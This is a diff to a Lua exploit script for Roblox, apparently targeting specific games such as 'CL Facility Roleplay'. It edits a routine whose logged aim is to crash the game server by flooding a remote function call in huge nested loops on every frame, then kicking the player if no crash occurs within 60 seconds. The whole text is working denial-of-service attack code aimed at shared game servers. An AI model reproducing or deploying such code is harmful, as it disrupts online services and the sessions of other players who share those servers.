@@ -827,24 +827,21 @@ function C.K_6416498845() -- CL Facility Roleplay
 	--end
 	warn('Game server completed sending request!')
 	warn('Attempting to crash')
-		wait(1)
-	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
-	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
-
+		
 	game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
 			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
 				pcall(function()
 					SettingsService.RF.Get:InvokeServer()
-					SettingsService.RF.Get:InvokeServer()
+					--SettingsService.RF.Get:InvokeServer()
 				end)    
 			end
 		end
 	end)
 
-	wait(55)
-	warn('Client did not crash server within 55 seconds of Get Request.')
-	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 55 seconds of last Get Request')
+	wait(60)
+	warn('Client did not crash server within 60 seconds of Get Request.')
+	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 60 seconds of last Get Request')
 end
 function C.K_3226555017()
 	repeat wait() until game:IsLoaded()
